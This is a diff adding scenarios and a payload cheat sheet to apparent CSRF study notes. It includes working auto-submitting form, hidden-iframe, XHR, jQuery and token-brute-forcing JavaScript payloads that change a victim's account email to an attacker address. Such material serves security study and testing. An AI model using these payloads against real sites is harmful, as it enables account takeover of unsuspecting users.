@@ -1,3 +1,4 @@
+## Scenarios
 ### No Defense
 ```html
 <form method="POST" action="https://ac741ff11f938fe1801459c7009e0090.web-security-academy.net/my-account/change-email">
@@ -115,8 +116,82 @@ document.forms[0].submit();
 </script>
 ```
 
-#### CSRF where 
+#### CSRF with Unverified Anti-CSRF Token
+Another possible scenario is when the application implements strong Anti-CSRF tokens but lacks the verification server-side. This may seem unlikely, but it has occurred!
+```html
+<form action="change.php" >
+<input type="hidden" name="anti_csrf" value="bgoDZVGis4bdsh672388293OrttIvgV">
+<input type="hidden" name="old" value="myC00Lemail@victim.site">
+<input type="email" name="new" placeholder="your new email" required>
+<input type="submit" value="Confirm">
+</form>
+```
 
+#### Bruteforcable CSRF tokens
+Some applications generates anti-CSRF tokens with an extremely poor level of randomness, therefore, requiring only a few attempts to brute force the mechanism
+
+
+## Payloads
+### GET Requests
+#### No interaction needed to trigger
+via HTML tags
+```html
+<iframe src=URL>
+<script src=URL />
+<input type="image" src=URL alt="">
+<embed src=URL>
+<audio src=URL>
+<video src=URL>
+<source src=URL >
+<video poster=URL>
+<link rel="stylesheet" href=URL>
+<object data=URL>
+<body background=URL>
+<div style="background:url(URL)">
+<style>body { background:url(URL) } </style>
+ 
+```
+
+via HTML tags dynamically created by Javascript
+```js
+function MakeGET(tokenID) {
+var url = "http://victim.site/csrf/brute/change.php?";
+url += "old=myoldemail&confirm=1&";
+url += "new=attackerEmail&csrfToken=" + tokenID;
+new Image().src = url; //GET Request
+}
+```
+
+### POST Requests
+#### Auto-submitting Form
+Via Hidden IFrames
+```html
+<iframe style="display:none" name="CSRFrame"></iframe>
+<form action="change.php" method="POST" id="CSRForm" target="CSRFrame">
+<input name="old" value="myC00Lemail@victim.site">
+<input name="new" value="evil@hacker.site">
+</form>
+<script>document.getElementById("CSRForm").submit()</script>
+```
+
+or XHR requests
+```js
+var url = "URL";
+var params = "old=mycoolemail@victim.site&new=evil@hacker.site";
+var CSRF = new XMLHttpRequest();
+CSRF.open("POST", url, false);
+CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+CSRF.send(params);
+```
+
+or via JQuery
+```js
+$.ajax({
+type: "POST",
+url: "URL",
+data: "old=mycoolemail@victim.site&new=evil@hacker.site",
+});
+```
 ***
 
 ## Mitigations
